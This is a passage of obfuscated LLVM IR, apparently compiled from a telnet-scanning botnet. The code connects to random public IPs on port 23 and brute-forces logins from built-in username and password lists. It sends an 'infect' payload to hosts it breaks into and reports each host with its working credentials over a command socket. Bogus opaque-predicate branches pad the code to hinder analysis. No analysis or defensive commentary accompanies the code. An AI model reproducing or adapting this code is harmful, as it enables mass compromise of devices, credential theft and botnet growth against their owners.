  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 9
  %953 = load i8*, i8** %952, align 8
  %954 = call i32 @contains_fail(i8* %953)
  %955 = icmp ne i32 %954, 0
  br i1 %955, label %956, label %960

; <label>:956:                                    ; preds = %943
  %957 = load i32, i32* %13, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %958
  call void @advance_state(%struct.telstate_t* %959, i32 0)
  br label %1044

; <label>:960:                                    ; preds = %943
  %961 = load i32, i32* %13, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %962
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %963, i32 0, i32 9
  %965 = load i8*, i8** %964, align 8
  %966 = call i32 @contains_success(i8* %965)
  %967 = icmp ne i32 %966, 0
  br i1 %967, label %968, label %1023

; <label>:968:                                    ; preds = %960
  %969 = load i32, i32* @x.83
  %970 = load i32, i32* @y.84
  %971 = sub i32 %969, 1
  %972 = mul i32 %969, %971
  %973 = urem i32 %972, 2
  %974 = icmp eq i32 %973, 0
  %975 = icmp slt i32 %970, 10
  %976 = or i1 %974, %975
  br i1 %976, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %968
  %977 = load i32, i32* %13, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 3
  %981 = load i8, i8* %980, align 1
  %982 = zext i8 %981 to i32
  %983 = icmp eq i32 %982, 2
  %984 = load i32, i32* @x.83
  %985 = load i32, i32* @y.84
  %986 = sub i32 %984, 1
  %987 = mul i32 %984, %986
  %988 = urem i32 %987, 2
  %989 = icmp eq i32 %988, 0
  %990 = icmp slt i32 %985, 10
  %991 = or i1 %989, %990
  br i1 %991, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %983, label %992, label %996

; <label>:992:                                    ; preds = %originalBBpart2144
  %993 = load i32, i32* %13, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %994
  call void @advance_state(%struct.telstate_t* %995, i32 7)
  br label %1022

; <label>:996:                                    ; preds = %originalBBpart2144
  %997 = load i32, i32* @mainCommSock, align 4
  %998 = load i32, i32* %13, align 4
  %999 = sext i32 %998 to i64
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %999
  %1001 = call i8* @get_telstate_host(%struct.telstate_t* %1000)
  %1002 = load i32, i32* %13, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 4
  %1006 = load i8, i8* %1005, align 2
  %1007 = zext i8 %1006 to i64
  %1008 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %1007
  %1009 = load i8*, i8** %1008, align 8
  %1010 = load i32, i32* %13, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1011
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1012, i32 0, i32 5
  %1014 = load i8, i8* %1013, align 1
  %1015 = zext i8 %1014 to i64
  %1016 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %1015
  %1017 = load i8*, i8** %1016, align 8
  %1018 = call i32 (i32, i8*, ...) @sockprintf(i32 %997, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.138, i32 0, i32 0), i8* %1001, i8* %1009, i8* %1017)
  %1019 = load i32, i32* %13, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1020
  call void @advance_state(%struct.telstate_t* %1021, i32 7)
  br label %1022

; <label>:1022:                                   ; preds = %996, %992
  br label %1027

; <label>:1023:                                   ; preds = %960
  %1024 = load i32, i32* %13, align 4
  %1025 = sext i32 %1024 to i64
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1025
  call void @reset_telstate(%struct.telstate_t* %1026)
  br label %1027

; <label>:1027:                                   ; preds = %1023, %1022
  %1028 = load i32, i32* @x.83
  %1029 = load i32, i32* @y.84
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1027
  %1036 = load i32, i32* @x.83
  %1037 = load i32, i32* @y.84
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1044

; <label>:1044:                                   ; preds = %originalBBpart2148, %956
  %1045 = load i32, i32* @x.83
  %1046 = load i32, i32* @y.84
  %1047 = sub i32 %1045, 1
  %1048 = mul i32 %1045, %1047
  %1049 = urem i32 %1048, 2
  %1050 = icmp eq i32 %1049, 0
  %1051 = icmp slt i32 %1046, 10
  %1052 = or i1 %1050, %1051
  br i1 %1052, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1044
  %1053 = load i32, i32* @x.83
  %1054 = load i32, i32* @y.84
  %1055 = sub i32 %1053, 1
  %1056 = mul i32 %1053, %1055
  %1057 = urem i32 %1056, 2
  %1058 = icmp eq i32 %1057, 0
  %1059 = icmp slt i32 %1054, 10
  %1060 = or i1 %1058, %1059
  br i1 %1060, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1315

; <label>:1061:                                   ; preds = %929
  %1062 = load i32, i32* @x.83
  %1063 = load i32, i32* @y.84
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1061
  %1070 = load i32, i32* %13, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 7
  %1074 = load i32, i32* %1073, align 16
  %1075 = add i32 %1074, 7
  %1076 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1077 = icmp ult i32 %1075, %1076
  %1078 = load i32, i32* @x.83
  %1079 = load i32, i32* @y.84
  %1080 = sub i32 %1078, 1
  %1081 = mul i32 %1078, %1080
  %1082 = urem i32 %1081, 2
  %1083 = icmp eq i32 %1082, 0
  %1084 = icmp slt i32 %1079, 10
  %1085 = or i1 %1083, %1084
  br i1 %1085, label %originalBBpart2161, label %originalBB154alteredBB

originalBBpart2161:                               ; preds = %originalBB154
  br i1 %1077, label %1086, label %1106

; <label>:1086:                                   ; preds = %originalBBpart2161
  %1087 = load i32, i32* @x.83
  %1088 = load i32, i32* @y.84
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %1086
  %1095 = load i32, i32* %13, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1096
  call void @reset_telstate(%struct.telstate_t* %1097)
  %1098 = load i32, i32* @x.83
  %1099 = load i32, i32* @y.84
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br label %1106

; <label>:1106:                                   ; preds = %originalBBpart2165, %originalBBpart2161
  %1107 = load i32, i32* @x.83
  %1108 = load i32, i32* @y.84
  %1109 = sub i32 %1107, 1
  %1110 = mul i32 %1107, %1109
  %1111 = urem i32 %1110, 2
  %1112 = icmp eq i32 %1111, 0
  %1113 = icmp slt i32 %1108, 10
  %1114 = or i1 %1112, %1113
  br i1 %1114, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %1106
  %1115 = load i32, i32* @x.83
  %1116 = load i32, i32* @y.84
  %1117 = sub i32 %1115, 1
  %1118 = mul i32 %1115, %1117
  %1119 = urem i32 %1118, 2
  %1120 = icmp eq i32 %1119, 0
  %1121 = icmp slt i32 %1116, 10
  %1122 = or i1 %1120, %1121
  br i1 %1122, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br label %1298

; <label>:1123:                                   ; preds = %188
  %1124 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1125 = load i32, i32* %13, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 7
  store i32 %1124, i32* %1128, align 16
  %1129 = load i32, i32* %13, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 0
  %1133 = load i32, i32* %1132, align 16
  %1134 = call i64 @send(i32 %1133, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i64 4, i32 16384)
  %1135 = icmp slt i64 %1134, 0
  br i1 %1135, label %1136, label %1137

; <label>:1136:                                   ; preds = %1123
  br label %1137

; <label>:1137:                                   ; preds = %1136, %1123
  %1138 = load i32, i32* @x.83
  %1139 = load i32, i32* @y.84
  %1140 = sub i32 %1138, 1
  %1141 = mul i32 %1138, %1140
  %1142 = urem i32 %1141, 2
  %1143 = icmp eq i32 %1142, 0
  %1144 = icmp slt i32 %1139, 10
  %1145 = or i1 %1143, %1144
  br i1 %1145, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1137
  %1146 = load i32, i32* %13, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 0
  %1150 = load i32, i32* %1149, align 16
  %1151 = call i64 @send(i32 %1150, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.140, i32 0, i32 0), i64 7, i32 16384)
  %1152 = icmp slt i64 %1151, 0
  %1153 = load i32, i32* @x.83
  %1154 = load i32, i32* @y.84
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br i1 %1152, label %1161, label %1178

; <label>:1161:                                   ; preds = %originalBBpart2173
  %1162 = load i32, i32* @x.83
  %1163 = load i32, i32* @y.84
  %1164 = sub i32 %1162, 1
  %1165 = mul i32 %1162, %1164
  %1166 = urem i32 %1165, 2
  %1167 = icmp eq i32 %1166, 0
  %1168 = icmp slt i32 %1163, 10
  %1169 = or i1 %1167, %1168
  br i1 %1169, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1161
  %1170 = load i32, i32* @x.83
  %1171 = load i32, i32* @y.84
  %1172 = sub i32 %1170, 1
  %1173 = mul i32 %1170, %1172
  %1174 = urem i32 %1173, 2
  %1175 = icmp eq i32 %1174, 0
  %1176 = icmp slt i32 %1171, 10
  %1177 = or i1 %1175, %1176
  br i1 %1177, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br label %1178

; <label>:1178:                                   ; preds = %originalBBpart2177, %originalBBpart2173
  %1179 = load i32, i32* %13, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 0
  %1183 = load i32, i32* %1182, align 16
  %1184 = load i8*, i8** @infect, align 8
  %1185 = load i8*, i8** @infect, align 8
  %1186 = call i64 @strlen(i8* %1185) #10
  %1187 = call i64 @send(i32 %1183, i8* %1184, i64 %1186, i32 16384)
  %1188 = icmp slt i64 %1187, 0
  br i1 %1188, label %1189, label %1215

; <label>:1189:                                   ; preds = %1178
  %1190 = load i32, i32* @mainCommSock, align 4
  %1191 = load i32, i32* %13, align 4
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1192
  %1194 = call i8* @get_telstate_host(%struct.telstate_t* %1193)
  %1195 = load i32, i32* %13, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 4
  %1199 = load i8, i8* %1198, align 2
  %1200 = zext i8 %1199 to i64
  %1201 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %1200
  %1202 = load i8*, i8** %1201, align 8
  %1203 = load i32, i32* %13, align 4
  %1204 = sext i32 %1203 to i64
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1204
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1205, i32 0, i32 5
  %1207 = load i8, i8* %1206, align 1
  %1208 = zext i8 %1207 to i64
  %1209 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %1208
  %1210 = load i8*, i8** %1209, align 8
  %1211 = call i32 (i32, i8*, ...) @sockprintf(i32 %1190, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.141, i32 0, i32 0), i8* %1194, i8* %1202, i8* %1210)
  %1212 = load i32, i32* %13, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1213
  call void @reset_telstate(%struct.telstate_t* %1214)
  br label %1315

; <label>:1215:                                   ; preds = %1178
  %1216 = load i32, i32* %13, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 7
  %1220 = load i32, i32* %1219, align 16
  %1221 = add i32 %1220, 25
  %1222 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1223 = icmp ult i32 %1221, %1222
  br i1 %1223, label %1224, label %1297

; <label>:1224:                                   ; preds = %1215
  %1225 = load i32, i32* @mainCommSock, align 4
  %1226 = load i32, i32* %13, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1227
  %1229 = call i8* @get_telstate_host(%struct.telstate_t* %1228)
  %1230 = load i32, i32* %13, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 4
  %1234 = load i8, i8* %1233, align 2
  %1235 = zext i8 %1234 to i64
  %1236 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %1235
  %1237 = load i8*, i8** %1236, align 8
  %1238 = load i32, i32* %13, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 5
  %1242 = load i8, i8* %1241, align 1
  %1243 = zext i8 %1242 to i64
  %1244 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %1243
  %1245 = load i8*, i8** %1244, align 8
  %1246 = call i32 (i32, i8*, ...) @sockprintf(i32 %1225, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.142, i32 0, i32 0), i8* %1229, i8* %1237, i8* %1245)
  %1247 = load i32, i32* %13, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 3
  %1251 = load i8, i8* %1250, align 1
  %1252 = zext i8 %1251 to i32
  %1253 = icmp ne i32 %1252, 3
  br i1 %1253, label %1254, label %1277

; <label>:1254:                                   ; preds = %1224
  %1255 = load i32, i32* @mainCommSock, align 4
  %1256 = load i32, i32* %13, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1257
  %1259 = call i8* @get_telstate_host(%struct.telstate_t* %1258)
  %1260 = load i32, i32* %13, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 4
  %1264 = load i8, i8* %1263, align 2
  %1265 = zext i8 %1264 to i64
  %1266 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %1265
  %1267 = load i8*, i8** %1266, align 8
  %1268 = load i32, i32* %13, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 5
  %1272 = load i8, i8* %1271, align 1
  %1273 = zext i8 %1272 to i64
  %1274 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %1273
  %1275 = load i8*, i8** %1274, align 8
  %1276 = call i32 (i32, i8*, ...) @sockprintf(i32 %1255, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.143, i32 0, i32 0), i8* %1259, i8* %1267, i8* %1275)
  br label %1277

; <label>:1277:                                   ; preds = %1254, %1224
  %1278 = load i32, i32* @x.83
  %1279 = load i32, i32* @y.84
  %1280 = sub i32 %1278, 1
  %1281 = mul i32 %1278, %1280
  %1282 = urem i32 %1281, 2
  %1283 = icmp eq i32 %1282, 0
  %1284 = icmp slt i32 %1279, 10
  %1285 = or i1 %1283, %1284
  br i1 %1285, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1277
  %1286 = load i32, i32* %13, align 4
  %1287 = sext i32 %1286 to i64
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1287
  call void @reset_telstate(%struct.telstate_t* %1288)
  %1289 = load i32, i32* @x.83
  %1290 = load i32, i32* @y.84
  %1291 = sub i32 %1289, 1
  %1292 = mul i32 %1289, %1291
  %1293 = urem i32 %1292, 2
  %1294 = icmp eq i32 %1293, 0
  %1295 = icmp slt i32 %1290, 10
  %1296 = or i1 %1294, %1295
  br i1 %1296, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %1297

; <label>:1297:                                   ; preds = %originalBBpart2181, %1215
  br label %1298

; <label>:1298:                                   ; preds = %1297, %originalBBpart2169, %originalBBpart2140, %867, %771, %originalBBpart2106, %originalBBpart298, %442, %188
  %1299 = load i32, i32* @x.83
  %1300 = load i32, i32* @y.84
  %1301 = sub i32 %1299, 1
  %1302 = mul i32 %1299, %1301
  %1303 = urem i32 %1302, 2
  %1304 = icmp eq i32 %1303, 0
  %1305 = icmp slt i32 %1300, 10
  %1306 = or i1 %1304, %1305
  br i1 %1306, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1298
  %1307 = load i32, i32* @x.83
  %1308 = load i32, i32* @y.84
  %1309 = sub i32 %1307, 1
  %1310 = mul i32 %1307, %1309
  %1311 = urem i32 %1310, 2
  %1312 = icmp eq i32 %1311, 0
  %1313 = icmp slt i32 %1308, 10
  %1314 = or i1 %1312, %1313
  br i1 %1314, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br label %1315

; <label>:1315:                                   ; preds = %originalBBpart2185, %1189, %originalBBpart2152, %905, %893, %originalBBpart2122, %767, %739, %667, %originalBBpart290, %originalBBpart286, %375, %312, %283
  %1316 = load i32, i32* %13, align 4
  %1317 = add nsw i32 %1316, 1
  store i32 %1317, i32* %13, align 4
  br label %155

; <label>:1318:                                   ; preds = %originalBBpart234
  br label %137
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1320 = alloca i32, align 4
  %1321 = alloca i32, align 4
  %1322 = alloca i32, align 4
  %1323 = alloca i32, align 4
  %1324 = alloca i32, align 4
  %1325 = alloca i32, align 4
  %1326 = alloca [128 x i8], align 16
  %1327 = alloca i8, align 1
  %1328 = alloca i32, align 4
  %1329 = alloca %struct.__sigset_t, align 8
  %1330 = alloca %struct.timeval, align 8
  %1331 = alloca i32, align 4
  %1332 = alloca i32, align 4
  %1333 = alloca [256 x i8], align 16
  %1334 = alloca i8*, align 8
  %1335 = alloca %struct.sockaddr_in, align 4
  %1336 = alloca i8*, align 8
  %1337 = alloca i8*, align 8
  %1338 = alloca i32, align 4
  %1339 = alloca i32, align 4
  store i32 %0, i32* %1320, align 4
  store i32 %1, i32* %1321, align 4
  %1340 = load i32, i32* %1321, align 4
  store i32 %1340, i32* %1328, align 4
  %1341 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1342 = call i32 @rand_cmwc()
  %_ = sub i32 0, %1341
  %gen = add i32 %_, %1342
  %_1 = shl i32 %1341, %1342
  %_2 = sub i32 0, %1341
  %gen3 = add i32 %_2, %1342
  %_4 = sub i32 %1341, %1342
  %gen5 = mul i32 %_4, %1342
  %_6 = sub i32 %1341, %1342
  %gen7 = mul i32 %_6, %1342
  %1343 = xor i32 %1341, %1342
  call void @srand(i32 %1343) #2
  %1344 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1335, i32 0, i32 0
  store i16 2, i16* %1344, align 4
  %1345 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1346 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1335, i32 0, i32 1
  store i16 %1345, i16* %1346, align 2
  %1347 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1335, i32 0, i32 3
  %1348 = getelementptr inbounds [8 x i8], [8 x i8]* %1347, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1348, i8 0, i64 8, i32 4, i1 false)
  %1349 = call noalias i8* @malloc(i64 1025) #2
  store i8* %1349, i8** %1334, align 8
  %1350 = load i8*, i8** %1334, align 8
  call void @llvm.memset.p0i8.i64(i8* %1350, i8 0, i64 1025, i32 1, i1 false)
  %1351 = load i32, i32* %1328, align 4
  %1352 = zext i32 %1351 to i64
  %1353 = call i8* @llvm.stacksave()
  store i8* %1353, i8** %1336, align 8
  %1354 = alloca %struct.telstate_t, i64 %1352, align 16
  %1355 = bitcast %struct.telstate_t* %1354 to i8*
  %1356 = load i32, i32* %1328, align 4
  %1357 = sext i32 %1356 to i64
  %_8 = shl i64 %1357, 5
  %_9 = shl i64 %1357, 5
  %_10 = sub i64 %1357, 5
  %gen11 = mul i64 %_10, 5
  %_12 = sub i64 0, %1357
  %gen13 = add i64 %_12, 5
  %1358 = mul i64 %1357, 5
  call void @llvm.memset.p0i8.i64(i8* %1355, i8 0, i64 %1358, i32 16, i1 false)
  store i32 0, i32* %1322, align 4
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %76
  %1359 = load i32, i32* %13, align 4
  %_15 = sub i32 0, %1359
  %gen16 = add i32 %_15, 1
  %1360 = add nsw i32 %1359, 1
  store i32 %1360, i32* %13, align 4
  br label %originalBB14

originalBB20alteredBB:                            ; preds = %originalBB20, %95
  store i32 0, i32* %15, align 4
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %119
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %138
  store i32 0, i32* %13, align 4
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %155
  %1361 = load i32, i32* %13, align 4
  %1362 = load i32, i32* %19, align 4
  %1363 = icmp slt i32 %1361, %1362
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %203
  %1364 = load i32, i32* %13, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 9
  %1368 = load i8*, i8** %1367, align 8
  store i8* %1368, i8** %28, align 8
  %1369 = load i32, i32* %13, align 4
  %1370 = sext i32 %1369 to i64
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1370
  %1372 = bitcast %struct.telstate_t* %1371 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1372, i8 0, i64 32, i32 16, i1 false)
  %1373 = load i8*, i8** %28, align 8
  %1374 = load i32, i32* %13, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 9
  store i8* %1373, i8** %1377, align 8
  %1378 = call i32 @GetRandomPublicIP()
  %1379 = load i32, i32* %13, align 4
  %1380 = sext i32 %1379 to i64
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1380
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1381, i32 0, i32 1
  store i32 %1378, i32* %1382, align 4
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %247
  %1383 = load i32, i32* %13, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1384
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1385, i32 0, i32 5
  %1387 = load i8, i8* %1386, align 1
  %_41 = sub i8 %1387, 1
  %gen42 = mul i8 %_41, 1
  %_43 = sub i8 0, %1387
  %gen44 = add i8 %_43, 1
  %_45 = sub i8 %1387, 1
  %gen46 = mul i8 %_45, 1
  %_47 = sub i8 %1387, 1
  %gen48 = mul i8 %_47, 1
  %_49 = shl i8 %1387, 1
  %_50 = sub i8 %1387, 1
  %gen51 = mul i8 %_50, 1
  %_52 = shl i8 %1387, 1
  %1388 = add i8 %1387, 1
  store i8 %1388, i8* %1386, align 1
  %1389 = load i32, i32* %13, align 4
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 4
  %1393 = load i8, i8* %1392, align 2
  %_53 = shl i8 %1393, 1
  %_54 = shl i8 %1393, 1
  %_55 = sub i8 %1393, 1
  %gen56 = mul i8 %_55, 1
  %1394 = add i8 %1393, 1
  store i8 %1394, i8* %1392, align 2
  %1395 = load i32, i32* %13, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 5
  %1399 = load i8, i8* %1398, align 1
  %1400 = zext i8 %1399 to i64
  %1401 = icmp eq i64 %1400, 20
  br label %originalBB40

originalBB60alteredBB:                            ; preds = %originalBB60, %288
  %1402 = load i32, i32* %13, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1404, i32 0, i32 4
  %1406 = load i8, i8* %1405, align 2
  %1407 = zext i8 %1406 to i64
  %1408 = icmp eq i64 %1407, 20
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %318
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %335
  %1409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
